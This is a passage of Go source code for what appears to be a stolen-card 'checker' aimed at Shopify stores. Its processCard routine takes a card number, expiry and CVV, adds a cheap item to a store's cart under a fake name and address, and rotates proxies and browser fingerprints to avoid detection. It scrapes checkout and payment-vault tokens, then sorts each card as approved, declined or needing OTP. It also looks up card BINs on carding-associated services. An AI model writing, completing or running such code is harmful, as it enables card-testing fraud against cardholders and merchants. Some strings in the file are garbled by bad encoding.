                json.NewDecoder(resp2.Body).Decode(&d2)
                prods2, _ := d2["products"].([]interface{})
                var out2 []map[string]interface{}
                for _, p2 := range prods2 {
                        if pm2, ok2 := p2.(map[string]interface{}); ok2 {
                                out2 = append(out2, pm2)
                        }
                }
                return out2, nil
        }
        var prods2 []map[string]interface{}
        if proxyURL != "" {
                prods2, _ = tryFetch2(proxyURL)
        }
        if len(prods2) == 0 {
                prods2, _ = tryFetch2("")
        }
        var bestPrice float64 = -1
        var bestProd *ProductResult
        for _, p := range prods2 {
                ptype := strings.ToLower(fmt.Sprintf("%v", p["product_type"]))
                if skipProductTypes[ptype] {
                        continue
                }
                for _, v := range p["variants"].([]interface{}) {
                        vm, ok := v.(map[string]interface{})
                        if !ok {
                                continue
                        }
                        // Only physical variants
                        ships := false
                        if rs, ok2 := vm["requires_shipping"].(bool); ok2 {
                                ships = rs
                        }
                        if !ships {
                                continue
                        }
                        if avail, ok2 := vm["available"].(bool); ok2 && !avail {
                                continue
                        }
                        priceStr := strings.ReplaceAll(fmt.Sprintf("%v", vm["price"]), ",", "")
                        price, err2 := strconv.ParseFloat(priceStr, 64)
                        if err2 != nil || price <= 0 {
                                continue
                        }
                        if bestPrice < 0 || price < bestPrice {
                                bestPrice = price
                                vidStr := ""
                                switch vid := vm["id"].(type) {
                                case float64:
                                        vidStr = strconv.FormatInt(int64(vid), 10)
                                case json.Number:
                                        vidStr = vid.String()
                                default:
                                        vidStr = fmt.Sprintf("%v", vid)
                                }
                                bestProd = &ProductResult{
                                        Site:             domain,
                                        Price:            fmt.Sprintf("%.2f", price),
                                        VariantID:        vidStr,
                                        RequiresShipping: true,
                                }
                        }
                }
        }
        if bestProd != nil {
                return bestProd, nil
        }
        return nil, fmt.Errorf("no physical products found")
}

// BIN lookup

type BINInfo struct {
        Brand   string
        Type    string
        Level   string
        Bank    string
        Country string
        Flag    string
}

var binFallback = BINInfo{"-", "-", "-", "-", "-", "ÃƒÆ’Ã‚Â°Ãƒâ€¦Ã‚Â¸Ãƒâ€šÃ‚ÂÃƒâ€šÃ‚Â³ÃƒÆ’Ã‚Â¯Ãƒâ€šÃ‚Â¸Ãƒâ€šÃ‚Â"}

func binLookup(bin string) BINInfo {
        bin = strings.TrimSpace(bin)
        if len(bin) > 6 {
                bin = bin[:6]
        }
        if len(bin) < 6 {
                return binFallback
        }
        if v, ok := binCache.Load(bin); ok {
                return v.(BINInfo)
        }

        type attempt struct {
                url  string
                parse func([]byte) (BINInfo, bool)
        }
        attempts := []attempt{
                {
                        "https://bins.antipublic.cc/bins/" + bin,
                        func(b []byte) (BINInfo, bool) {
                                var d map[string]interface{}
                                if json.Unmarshal(b, &d) != nil { return binFallback, false }
                                brand := fmt.Sprintf("%v", d["brand"])
                                if brand == "" || brand == "<nil>" { return binFallback, false }
                                return BINInfo{
                                        Brand: orDash(brand), Type: orDash(fmt.Sprintf("%v", d["type"])),
                                        Level: orDash(fmt.Sprintf("%v", d["level"])), Bank: orDash(fmt.Sprintf("%v", d["bank"])),
                                        Country: orDash(fmt.Sprintf("%v", d["country_name"])), Flag: orDash(fmt.Sprintf("%v", d["country_flag"])),
                                }, true
                        },
                },
                {
                        "https://lookup.binlist.net/" + bin,
                        func(b []byte) (BINInfo, bool) {
                                var d map[string]interface{}
                                if json.Unmarshal(b, &d) != nil { return binFallback, false }
                                scheme := strings.ToUpper(fmt.Sprintf("%v", d["scheme"]))
                                if scheme == "" || scheme == "<NIL>" { return binFallback, false }
                                bankName := ""
                                if bk, ok := d["bank"].(map[string]interface{}); ok {
                                        bankName = fmt.Sprintf("%v", bk["name"])
                                }
                                countryName, countryEmoji := "", "ÃƒÆ’Ã‚Â°Ãƒâ€¦Ã‚Â¸Ãƒâ€šÃ‚ÂÃƒâ€šÃ‚Â³ÃƒÆ’Ã‚Â¯Ãƒâ€šÃ‚Â¸Ãƒâ€šÃ‚Â"
                                if co, ok := d["country"].(map[string]interface{}); ok {
                                        countryName = fmt.Sprintf("%v", co["name"])
                                        if em := fmt.Sprintf("%v", co["emoji"]); em != "" && em != "<nil>" {
                                                countryEmoji = em
                                        }
                                }
                                return BINInfo{
                                        Brand: scheme, Type: strings.ToUpper(fmt.Sprintf("%v", d["type"])),
                                        Level: orDash(fmt.Sprintf("%v", d["brand"])), Bank: orDash(bankName),
                                        Country: orDash(countryName), Flag: countryEmoji,
                                }, true
                        },
                },
        }

        // Pooled HTTP client for BIN lookups — called for every charged card.
        // Pooling avoids a fresh TLS handshake per lookup (saves ~300ms each).
        stdClient := &http.Client{
                Timeout: 8 * time.Second,
                Transport: &http.Transport{
                        TLSHandshakeTimeout:   5 * time.Second,
                        ResponseHeaderTimeout: 7 * time.Second,
                        TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
                        DialContext: (&net.Dialer{
                                Timeout:   5 * time.Second,
                                KeepAlive: 30 * time.Second,
                        }).DialContext,
                        MaxIdleConns:          100,
                        MaxIdleConnsPerHost:   20,
                        MaxConnsPerHost:       0,
                        IdleConnTimeout:       60 * time.Second,
                },
        }
        type result struct {
                info BINInfo
                ok   bool
        }
        ch := make(chan result, len(attempts))
        for _, a := range attempts {
                a := a
                go func() {
                        resp, err := stdClient.Get(a.url)
                        if err != nil { ch <- result{binFallback, false}; return }
                        defer resp.Body.Close()
                        if resp.StatusCode != 200 { ch <- result{binFallback, false}; return }
                        b, _ := io.ReadAll(resp.Body)
                        info, ok := a.parse(b)
                        ch <- result{info, ok}
                }()
        }
        for range attempts {
                r := <-ch
                if r.ok {
                        binCache.Store(bin, r.info)
                        return r.info
                }
        }
        return binFallback
}

func orDash(s string) string {
        if s == "" || s == "<nil>" || s == "<NIL>" {
                return "-"
        }
        return s
}

// Telegram notification (fire-and-forget)
type CheckResult struct {
        Success  bool
        Response string
        Gateway  string
        Price    string
        Currency string
}

// generatePageID returns a random 16-char hex string used as analytics.pageId.
// Mirrors checkout_engine.py's generate_page_id().
func generatePageID() string {
        b := make([]byte, 8)
        rand.Read(b)
        return fmt.Sprintf("%016x", b)
}

// evalRetrySubmit properly evaluates a retry submit result: checks receipt type,
// polls for pending receipts, and returns the correct CheckResult.
// Matches Python's inline receipt-check + poll pattern used in all retry handlers.
func evalRetrySubmit(sr map[string]interface{}, client tlsclient.HttpClient, gqlURL string, gqlHeaders map[string]string, sst, gateway, totalPrice, currency string) CheckResult {
        if sr == nil {
                return CheckResult{false, "nil retry result", gateway, totalPrice, currency}
        }
        typeName := fmt.Sprintf("%v", sr["__typename"])
        switch typeName {
        case "SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion", "SubmitSuccessWithReceipt":
                rc := navMap(sr, "receipt")
                if rc == nil || len(rc) == 0 {
                        return CheckResult{false, "Submit accepted but no receipt", gateway, totalPrice, currency}
                }
                rcType := fmt.Sprintf("%v", rc["__typename"])
                if rcType == "ProcessedReceipt" {
                        // Extract price from receipt
                        if po := navMap(rc, "purchaseOrder"); po != nil {
                                if tp := navMap(po, "totalAmountToPay"); tp != nil {
                                        if a := fmt.Sprintf("%v", tp["amount"]); a != "" && a != "<nil>" {
                                                totalPrice = a
                                        }
                                        if c := fmt.Sprintf("%v", tp["currencyCode"]); c != "" && c != "<nil>" {
                                                currency = c
                                        }
                                }
                        }
                        return CheckResult{true, "ORDER_PLACED", gateway, totalPrice, currency}
                }
                rid := fmt.Sprintf("%v", rc["id"])
                if rid == "" || rid == "<nil>" {
                        return CheckResult{false, "Submit accepted no receipt ID", gateway, totalPrice, currency}
                }
                // Poll for result — mirrors Python's inline poll in retry handlers
                pollBody := map[string]interface{}{
                        "id":            opIDPollForReceipt,
                        "variables":     map[string]interface{}{"receiptId": rid, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                }
                time.Sleep(1 * time.Second)
                for poll := 0; poll < 4; poll++ {
                        _, pt, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "PollForReceipt"}, gqlHeaders, pollBody)
                        if isCaptchaRequired(pt) {
                                return CheckResult{true, "CARD_DECLINED", gateway, totalPrice, currency}
                        }
                        var pj map[string]interface{}
                        if json.Unmarshal([]byte(pt), &pj) != nil {
                                time.Sleep(1 * time.Second)
                                continue
                        }
                        prec := navMap(pj, "data", "receipt")
                        if prec == nil {
                                time.Sleep(1 * time.Second)
                                continue
                        }
                        ptn := fmt.Sprintf("%v", prec["__typename"])
                        switch ptn {
                        case "ProcessedReceipt":
                                if po := navMap(prec, "purchaseOrder"); po != nil {
                                        if tp := navMap(po, "totalAmountToPay"); tp != nil {
                                                if a := fmt.Sprintf("%v", tp["amount"]); a != "" && a != "<nil>" {
                                                        totalPrice = a
                                                }
                                                if c := fmt.Sprintf("%v", tp["currencyCode"]); c != "" && c != "<nil>" {
                                                        currency = c
                                                }
                                        }
                                }
                                return CheckResult{true, "ORDER_PLACED", gateway, totalPrice, currency}
                        case "FailedReceipt":
                                if pe := navMap(prec, "processingError"); pe != nil {
                                        pet := fmt.Sprintf("%v", pe["__typename"])
                                        if pet == "PaymentFailed" {
                                                code := fmt.Sprintf("%v", pe["code"])
                                                msg := fmt.Sprintf("%v", pe["messageUntranslated"])
                                                if (code == "GENERIC_ERROR" || code == "PAYMENT_FAILED" || code == "<nil>" || code == "") && msg != "" && msg != "<nil>" {
                                                        return CheckResult{true, sanitizeMsg(extractCleanResponse(msg)), gateway, totalPrice, currency}
                                                }
                                                if code != "" && code != "<nil>" {
                                                        return CheckResult{true, sanitizeMsg(extractCleanResponse(code)), gateway, totalPrice, currency}
                                                }
                                        }
                                        code := fmt.Sprintf("%v", pe["code"])
                                        if code != "" && code != "<nil>" {
                                                return CheckResult{true, sanitizeMsg(extractCleanResponse(code)), gateway, totalPrice, currency}
                                        }
                                }
                                return CheckResult{true, "CARD_DECLINED", gateway, totalPrice, currency}
                        case "ActionRequiredReceipt":
                                return CheckResult{true, "OTP_REQUIRED", gateway, totalPrice, currency}
                        case "ProcessingReceipt", "WaitingReceipt":
                                time.Sleep(1 * time.Second)
                                continue
                        }
                }
                // Poll timeout — text-based fallbacks matching Python
                return CheckResult{true, "MISMATCHED_BILL", gateway, totalPrice, currency}
        case "SubmitFailed":
                return CheckResult{false, extractCleanResponse(fmt.Sprintf("%v", sr["reason"])), gateway, totalPrice, currency}
        case "SubmitRejected":
                errs := navSlice(sr, "errors")
                if len(errs) > 0 {
                        if em, ok := errs[0].(map[string]interface{}); ok {
                                code := fmt.Sprintf("%v", em["code"])
                                lm := fmt.Sprintf("%v", em["localizedMessage"])
                                if code != "" && code != "<nil>" {
                                        return CheckResult{false, sanitizeMsg(extractCleanResponse(code)), gateway, totalPrice, currency}
                                }
                                return CheckResult{false, sanitizeMsg(extractCleanResponse(lm)), gateway, totalPrice, currency}
                        }
                }
                return CheckResult{false, "SubmitRejected on retry", gateway, totalPrice, currency}
        }
        return CheckResult{false, "Unexpected retry result: " + typeName, gateway, totalPrice, currency}
}

// processCard is the public entry point — no product override, triedDigital=false.
func processCard(cc, mes, ano, cvv, siteURL, proxyStr string) CheckResult {
        return processCardFull(cc, mes, ano, cvv, siteURL, nil, proxyStr, false)
}

// processCardFull is the real implementation.
// prodOverride: if non-nil, skip fetchProducts and use this product directly.
// triedDigital: prevents infinite recursion when falling back to physical product.
func processCardFull(cc, mes, ano, cvv, siteURL string, prodOverride *ProductResult, proxyStr string, triedDigital bool) CheckResult {
        gateway := "Shopify Payments"
        totalPrice := "0.00"
        currency := "USD"

        ourl := siteURL
        if !strings.HasPrefix(ourl, "http") {
                ourl = "https://" + ourl
        }

        ua := pickUAProfile()
        acceptLang := acceptLangs[rand.Intn(len(acceptLangs))]
        addr := pickAddr(ourl)
        firstName, lastName := randomName()
        email := generateEmail(firstName, lastName)

        proxyURL := buildProxyURL(proxyStr)
        client, err := newTLSClient(proxyURL)
        if err != nil && proxyURL != "" {
                // Python: retry without proxy on client error
                client, err = newTLSClient("")
        }
        if err != nil {
                return CheckResult{false, "TLS client error: " + err.Error(), gateway, totalPrice, currency}
        }
        deliveryRetried := false

        var prod *ProductResult
        if prodOverride != nil {
                prod = prodOverride
        } else {
                var fetchErr error
                prod, fetchErr = fetchProducts(ourl, proxyStr)
                if fetchErr != nil {
                        return CheckResult{false, fetchErr.Error(), gateway, totalPrice, currency}
                }
        }
        variantID := prod.VariantID
        requiresShipping := prod.RequiresShipping

        // doCartAdd tries form-encoded â†’ JSON â†’ fresh-variant fallback.
        // On 429/503 it sleeps 1 s and retries once. Returns (ok, lastStatus, lastErr).
        doCartAdd := func(c tlsclient.HttpClient, vid string) (bool, int, error) {
                cartURL2 := ourl + "/cart/add.js"

                setCartHeaders := func(req *fhttp.Request, ct string) {
                        req.Header = fhttp.Header{
                                "user-agent":          []string{ua.UA},
                                "accept":              []string{"application/json, text/javascript, */*; q=0.01"},
                                "accept-language":     []string{acceptLang},
                                "content-type":        []string{ct},
                                "origin":              []string{ourl},
                                "referer":             []string{ourl + "/"},
                                "x-requested-with":    []string{"XMLHttpRequest"},
                                "sec-fetch-dest":      []string{"empty"},
                                "sec-fetch-mode":      []string{"cors"},
                                "sec-fetch-site":      []string{"same-origin"},
                                fhttp.HeaderOrderKey: []string{
                                        "user-agent", "accept", "accept-language", "content-type",
                                        "origin", "referer", "x-requested-with",
                                        "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                                        "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site",
                                },
                        }
                        if ua.ChUA != "" {
                                req.Header.Set("sec-ch-ua", ua.ChUA)
                                req.Header.Set("sec-ch-ua-mobile", ua.ChMobile)
                                req.Header.Set("sec-ch-ua-platform", ua.ChPlatform)
                        }
                }

                tryOnce := func(vid2 string) (bool, int, error) {
                        // Attempt 1: form-encoded
                        cr, _ := fhttp.NewRequest("POST", cartURL2, strings.NewReader(fmt.Sprintf("id=%s&quantity=1", vid2)))
                        setCartHeaders(cr, "application/x-www-form-urlencoded")
                        cResp, cErr := c.Do(cr)
                        cStatus := 0
                        if cResp != nil {
                                cStatus = cResp.StatusCode
                                io.Copy(io.Discard, cResp.Body)
                                cResp.Body.Close()
                        }
                        if cErr == nil && cStatus == 200 {
                                return true, cStatus, nil
                        }
                        // 429/503 → rate limited, back off with jitter and retry once
                        if cStatus == 429 || cStatus == 503 {
                                // Jittered back-off 600–1400 ms — faster recovery on transient 429.
                        time.Sleep(time.Duration(600+rand.Intn(800)) * time.Millisecond)
                                cr3, _ := fhttp.NewRequest("POST", cartURL2, strings.NewReader(fmt.Sprintf("id=%s&quantity=1", vid2)))
                                setCartHeaders(cr3, "application/x-www-form-urlencoded")
                                r3, e3 := c.Do(cr3)
                                if r3 != nil {
                                        cStatus = r3.StatusCode
                                        io.Copy(io.Discard, r3.Body)
                                        r3.Body.Close()
                                }
                                if e3 == nil && cStatus == 200 {
                                        return true, cStatus, nil
                                }
                                return false, cStatus, fmt.Errorf("rate limited (HTTP %d)", cStatus)
                        }
                        // Attempt 2: JSON body
                        varIDInt := 0
                        fmt.Sscanf(vid2, "%d", &varIDInt)
                        jsonCD, _ := json.Marshal(map[string]interface{}{
                                "items": []interface{}{map[string]interface{}{"id": varIDInt, "quantity": 1}},
                        })
                        cr2, _ := fhttp.NewRequest("POST", cartURL2, bytes.NewReader(jsonCD))
                        setCartHeaders(cr2, "application/json")
                        cResp2, cErr2 := c.Do(cr2)
                        if cResp2 != nil {
                                cStatus = cResp2.StatusCode
                                io.Copy(io.Discard, cResp2.Body)
                                cResp2.Body.Close()
                        }
                        return cErr2 == nil && cStatus == 200, cStatus, cErr2
                }

                // Pre-cart jitter: breaks thundering-herd from parallel goroutines hitting Shopify simultaneously.
                // Reduced from 100-900ms to 50-400ms for faster throughput under 100-user load while
                // still spreading concurrent requests enough to avoid 429 burst storms.
                time.Sleep(time.Duration(rand.Intn(350)+50) * time.Millisecond)
                ok, st, err := tryOnce(vid)
                if !ok && st == 422 {
                        // 422 can mean:
                        //  a) proxy IP is flagged â†’ try same variant without proxy
                        //  b) variant OOS / removed â†’ re-fetch a fresh product
                        // Try (a) first: re-attempt without proxy — sleep to avoid instant re-hit
                        time.Sleep(time.Duration(rand.Intn(600)+400) * time.Millisecond)
                        if clientNP2, npErr := newTLSClient(""); npErr == nil {
                                cOld := c
                                c = clientNP2
                                ok2, st2, err2 := tryOnce(vid)
                                if ok2 {
                                        // keep the no-proxy client for the rest of the flow
                                        client = clientNP2
                                        return ok2, st2, err2
                                }
                                c = cOld // restore original client
                                // Try (b): fresh variant
                                freshProd, ferr := fetchProducts(ourl, "")
                                if ferr == nil && freshProd != nil && freshProd.VariantID != "" && freshProd.VariantID != vid {
                                        c = clientNP2
                                        ok3, st3, err3 := tryOnce(freshProd.VariantID)
                                        if ok3 {
                                                variantID = freshProd.VariantID
                                                requiresShipping = freshProd.RequiresShipping
                                                client = clientNP2
                                        }
                                        return ok3, st3, err3
                                }
                                _ = st2
                                _ = err2
                        } else {
                                // fallback: just try fresh variant with original client
                                freshProd, ferr := fetchProducts(ourl, proxyStr)
                                if ferr == nil && freshProd != nil && freshProd.VariantID != "" && freshProd.VariantID != vid {
                                        ok2, st2, err2 := tryOnce(freshProd.VariantID)
                                        if ok2 {
                                                variantID = freshProd.VariantID
                                                requiresShipping = freshProd.RequiresShipping
                                        }
                                        return ok2, st2, err2
                                }
                        }
                }
                return ok, st, err
        }

        cartOK, cartStatus, cartErr := doCartAdd(client, variantID)
        if !cartOK && proxyURL != "" {
                // Retry without proxy
                clientNP, npErr := newTLSClient("")
                if npErr == nil {
                        cartOK, cartStatus, cartErr = doCartAdd(clientNP, variantID)
                        if cartOK {
                                client = clientNP // use the no-proxy client going forward
                        }
                }
        }
        if !cartOK {
                errMsg := "Cart add failed"
                if cartErr != nil {
                        errMsg = "Cart add error: " + cartErr.Error()
                } else if cartStatus > 0 {
                        errMsg = fmt.Sprintf("Cart add HTTP %d", cartStatus)
                }
                return CheckResult{false, errMsg, gateway, totalPrice, currency}
        }

        checkoutEndpoint := ourl + "/checkout/"
        chkReq, _ := fhttp.NewRequest("POST", checkoutEndpoint, nil)
        chkReq.Header = fhttp.Header{
                "user-agent":                  []string{ua.UA},
                "accept":                      []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
                "accept-language":             []string{acceptLang},
                "cache-control":               []string{"max-age=0"},
                "content-type":                []string{"application/x-www-form-urlencoded"},
                "origin":                      []string{ourl},
                "referer":                     []string{ourl + "/cart"},
                "upgrade-insecure-requests":   []string{"1"},
                "sec-fetch-dest":              []string{"document"},
                "sec-fetch-mode":              []string{"navigate"},
                "sec-fetch-site":              []string{"same-origin"},
                "sec-fetch-user":              []string{"?1"},
                fhttp.HeaderOrderKey: []string{
                        "user-agent", "accept", "accept-language", "cache-control",
                        "content-type", "origin", "referer", "upgrade-insecure-requests",
                        "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                        "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
                },
        }
        if ua.ChUA != "" {
                chkReq.Header.Set("sec-ch-ua", ua.ChUA)
                chkReq.Header.Set("sec-ch-ua-mobile", ua.ChMobile)
                chkReq.Header.Set("sec-ch-ua-platform", ua.ChPlatform)
        }
        checkoutResp, err := client.Do(chkReq)
        if err != nil {
                // Retry checkout without proxy (mirrors cart retry)
                if proxyURL != "" {
                        clientNPco, npcoErr := newTLSClient("")
                        if npcoErr == nil {
                                chkReq2, _ := fhttp.NewRequest("POST", checkoutEndpoint, nil)
                                chkReq2.Header = chkReq.Header
                                if co2, err2 := clientNPco.Do(chkReq2); err2 == nil {
                                        checkoutResp = co2
                                        client = clientNPco
                                        err = nil
                                }
                        }
                }
                if err != nil {
                        return CheckResult{false, "Checkout error: " + err.Error(), gateway, totalPrice, currency}
                }
        }
        defer checkoutResp.Body.Close()
        checkoutBody, _ := io.ReadAll(checkoutResp.Body)
        text := string(checkoutBody)

        // Final URL after redirects
        checkoutFinalURL := checkoutEndpoint
        if checkoutResp.Request != nil && checkoutResp.Request.URL != nil {
                checkoutFinalURL = checkoutResp.Request.URL.String()
        }

        if strings.Contains(strings.ToLower(checkoutFinalURL), "login") {
                return CheckResult{false, "Site requires login!", gateway, totalPrice, currency}
        }
        // Shopify shows this error page when the checkout session cannot be established.
        // Retryable — will pick a fresh site on next attempt.
        if strings.Contains(strings.ToLower(text), "we couldn't complete your") ||
                strings.Contains(strings.ToLower(text), "we couldn't complete") ||
                strings.Contains(strings.ToLower(text), "we could not complete") {
                return CheckResult{false, "Checkout: We couldn't complete", gateway, totalPrice, currency}
        }

        sst := checkoutResp.Header.Get("X-Checkout-One-Session-Token")
        if sst == "" {
                sst = checkoutResp.Header.Get("x-checkout-one-session-token")
        }
        if sst == "" {
                sst = extractBetween(text, `name="serialized-sessionToken" content="&quot;`, `&quot;`)
        }
        if sst == "" {
                sst = extractBetween(text, `name="serialized-sessionToken" content="`, `"`)
        }
        if sst == "" {
                sst = extractBetween(text, `"serializedSessionToken":"`, `"`)
        }
        if sst == "" {
                sst = extractBetween(text, `data-session-token="`, `"`)
        }
        if sst == "" {
                sst = extractBetween(text, `"sessionToken":"`, `"`)
        }
        if sst == "" {
                sst = extractBetween(text, "sessionToken&quot;:&quot;", "&quot;")
        }
        if sst == "" {
                sst = extractBetween(text, `"token":"`, `"`)
        }
        if sst == "" {
                // Shopify sometimes puts it in a JSON blob as checkoutToken
                sst = extractBetween(text, `"checkoutToken":"`, `"`)
        }
        if sst == "" {
                // Try query param pattern from the checkout URL itself
                if u, uerr := url.Parse(checkoutFinalURL); uerr == nil {
                        if t := u.Query().Get("token"); t != "" {
                                sst = t
                        }
                }
        }

        // Attempt token: extract from /checkouts/cn/<token> URL pattern first
        attemptToken := ""
        if m := regexp.MustCompile(`/checkouts/cn/([^/?]+)`).FindStringSubmatch(checkoutFinalURL); len(m) > 1 {
                attemptToken = m[1]
        }
        if attemptToken == "" {
                parts := strings.Split(strings.Split(checkoutFinalURL, "?")[0], "/")
                if len(parts) > 0 {
                        attemptToken = parts[len(parts)-1]
                }
        }

        queueToken := extractBetween(text, `"queueToken":"`, `"`)
        if queueToken == "" {
                queueToken = extractBetween(text, "queueToken&quot;:&quot;", "&quot;")
        }
        stableID := extractBetween(text, `"stableId":"`, `"`)
        if stableID == "" {
                stableID = extractBetween(text, "stableId&quot;:&quot;", "&quot;")
        }
        if stableID == "" {
                stableID = "1"
        }

        merch := extractBetween(text, "ProductVariantMerchandise/", "&quot;")
        if merch == "" {
                merch = extractBetween(text, "ProductVariantMerchandise/", `&q`)
        }
        if merch == "" {
                merch = extractBetween(text, `"merchandiseId":"gid://shopify/ProductVariantMerchandise/`, `"`)
        }
        if merch == "" {
                merch = variantID
        }

        // currency detection
        if c := extractBetween(text, "currencyCode&quot;:&quot;", "&quot;"); c != "" {
                currency = c
        } else if c := extractBetween(text, `"currencyCode":"`, `"`); c != "" {
                currency = c
        }

        // Switch address based on currency
        if cc2, ok := currencyToCountry[strings.ToUpper(currency)]; ok {
                addr = pickAddrByCountry(cc2)
        }

        subtotal := extractBetween(text, `"subtotalBeforeTaxesAndShipping":{"value":{"amount":"`, `"`)
        if subtotal == "" {
                subtotal = extractBetween(text, "subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot;")
        }
        if subtotal == "" {
                subtotal = prod.Price
        }
        if subtotal == "" {
                subtotal = "0.01"
        }

        // Build ID + source token + ident sig
        unescaped := strings.NewReplacer("&quot;", `"`, "&amp;", "&", "&#39;", "'").Replace(text)
        buildID := ""
        if m := regexp.MustCompile(`"commitSha"\s*:\s*"([a-f0-9]{40})"`).FindStringSubmatch(unescaped); len(m) > 1 {
                buildID = m[1]
        }
        sourceToken := extractBetween(text, `name="serialized-sourceToken" content="`, `"`)
        // ── identSig: 4 fallback patterns matching Python's ex_ident_sig ──────────
        identSig := extractBetween(text, "checkoutCardsinkCallerIdentificationSignature&quot;:&quot;", "&quot;")
        if identSig == "" {
                // Pattern 2: short prefix on entity-decoded HTML (fastest, confirmed)
                identSig = extractBetween(unescaped, `CardsinkCallerIdentificationSignature":"`, `"`)
        }
        if identSig == "" {
                // Pattern 3: full prefix on entity-decoded HTML
                identSig = extractBetween(unescaped, `checkoutCardsinkCallerIdentificationSignature":"`, `"`)
        }
        if identSig == "" {
                // Pattern 4: regex on unescaped HTML
                if m := regexp.MustCompile(`[Cc]ardsink[Cc]aller[Ii]dentification[Ss]ignature[":\s]+([A-Za-z0-9+/=_\-.]+)`).FindStringSubmatch(unescaped); len(m) > 1 {
                        identSig = m[1]
                }
        }
        // ── vaultURL: extract from HTML (hostedFieldsUrl pattern) ─────────────────
        vaultURL := ""
        {
                dec := unescaped
                // Pattern 1: direct /sessions URL already in HTML
                if m := regexp.MustCompile(`(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)`).FindStringSubmatch(dec); len(m) > 1 {
                        vaultURL = m[1]
                }
                if vaultURL == "" {
                        // Pattern 2: hostedFieldsUrl -> strip path -> + /sessions
                        if m := regexp.MustCompile(`"hostedFields[Uu]rl"\s*:\s*"(https://[^/"]+[^"]*?)"`).FindStringSubmatch(dec); len(m) > 1 {
                                if pu, perr := url.Parse(m[1]); perr == nil {
                                        vaultURL = pu.Scheme + "://" + pu.Host + "/sessions"
                                }
                        }
                }
        }
        // ── vaultDomain: extract from HTML for payment_session_scope ──────────────
        vaultDomain := ""
        {
                dec := unescaped
                // Pattern: "hostedFieldsUrl":"...","domain":"<value>"
                if m := regexp.MustCompile(`"hostedFields[Uu]rl"\s*:\s*"[^"]+"\s*,\s*"domain"\s*:\s*"([^"]+)"`).FindStringSubmatch(dec); len(m) > 1 {
                        vaultDomain = m[1]
                }
                if vaultDomain == "" {
                        // Fallback: any "domain" near shopify PCI URL
                        if m := regexp.MustCompile(`shopify(?:inc|cs)[^"]*"[^"]*"domain"\s*:\s*"([^"]+)"`).FindStringSubmatch(dec); len(m) > 1 {
                                vaultDomain = m[1]
                        }
                }
        }

        if sst == "" {
                return CheckResult{false, "Failed to get session token", gateway, totalPrice, currency}
        }

        // Build checkout-specific headers
        gqlHeaders := map[string]string{
                "user-agent":                   ua.UA,
                "accept":                       "application/json, text/plain, */*",
                "accept-language":              acceptLang,
                "content-type":                 "application/json",
                "origin":                       ourl,
                "referer":                      ourl,
                "shopify-checkout-client":      "checkout-web/1.0",
                "shopify-checkout-source":      fmt.Sprintf(`id="%s", type="cn"`, attemptToken),
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest":               "empty",
                "sec-fetch-mode":               "cors",
                "sec-fetch-site":               "same-origin",
        }
        if ua.ChUA != "" {
                gqlHeaders["sec-ch-ua"] = ua.ChUA
                gqlHeaders["sec-ch-ua-mobile"] = ua.ChMobile
                gqlHeaders["sec-ch-ua-platform"] = ua.ChPlatform
        }
        if buildID != "" {
                gqlHeaders["x-checkout-web-build-id"] = buildID
                gqlHeaders["x-checkout-web-deploy-stage"] = "production"
                gqlHeaders["x-checkout-web-server-handling"] = "fast"
                gqlHeaders["x-checkout-web-server-rendering"] = "yes"
        }
        if sourceToken != "" {
                gqlHeaders["x-checkout-web-source-id"] = sourceToken
        }

        gqlURL := fmt.Sprintf("https://%s/checkouts/internal/graphql/persisted", parseHostname(ourl))

        // Build delivery payload
        buildDeliveryLines := func(shipping bool) interface{} {
                if !shipping {
                        return []interface{}{}
                }
                return []interface{}{map[string]interface{}{
                        "destination": map[string]interface{}{
                                "partialStreetAddress": map[string]interface{}{
                                        "address1": addr.Address1, "address2": "", "city": addr.City,
                                        "countryCode": addr.CountryCode, "postalCode": addr.PostalCode,
                                        "firstName": firstName, "lastName": lastName,
                                        "zoneCode": addr.ZoneCode, "phone": addr.Phone,
                                },
                        },
                        "selectedDeliveryStrategy": map[string]interface{}{
                                "deliveryStrategyMatchingConditions": map[string]interface{}{
                                        "estimatedTimeInTransit": map[string]interface{}{"any": true},
                                        "shipments":              map[string]interface{}{"any": true},
                                },
                                "options": map[string]interface{}{},
                        },
                        "targetMerchandiseLines": map[string]interface{}{"any": true},
                        "deliveryMethodTypes":    []string{"SHIPPING"},
                        "expectedTotalPrice":     map[string]interface{}{"any": true},
                        "destinationChanged":     true,
                }}
        }

        noDeliveryReq := []interface{}{}
        if !requiresShipping {
                noDeliveryReq = []interface{}{map[string]interface{}{"stableId": stableID}}
        }

        merchandiseLines := []interface{}{map[string]interface{}{
                "stableId": stableID,
                "merchandise": map[string]interface{}{
                        "productVariantReference": map[string]interface{}{
                                "id":                fmt.Sprintf("gid://shopify/ProductVariantMerchandise/%s", merch),
                                "variantId":         fmt.Sprintf("gid://shopify/ProductVariant/%s", variantID),
                                "properties":        []interface{}{},
                                "sellingPlanId":     nil,
                                "sellingPlanDigest": nil,
                        },
                },
                "quantity":               map[string]interface{}{"items": map[string]interface{}{"value": 1}},
                "expectedTotalPrice":     map[string]interface{}{"any": true}, // avoid MERCHANDISE_EXPECTED_PRICE_MISMATCH
                "lineComponentsSource":   nil,
                "lineComponents":         []interface{}{},
        }}

        proposalVars := map[string]interface{}{
                "sessionInput": map[string]interface{}{"sessionToken": sst},
                "queueToken":   queueToken,
                "discounts":    map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
                "delivery": map[string]interface{}{
                        "deliveryLines":                buildDeliveryLines(requiresShipping),
                        "noDeliveryRequired":           noDeliveryReq,
                        "useProgressiveRates":          false,
                        "prefetchShippingRatesStrategy": nil,
                        "supportsSplitShipping":        true,
                },
                "deliveryExpectations": map[string]interface{}{"deliveryExpectationLines": []interface{}{}},
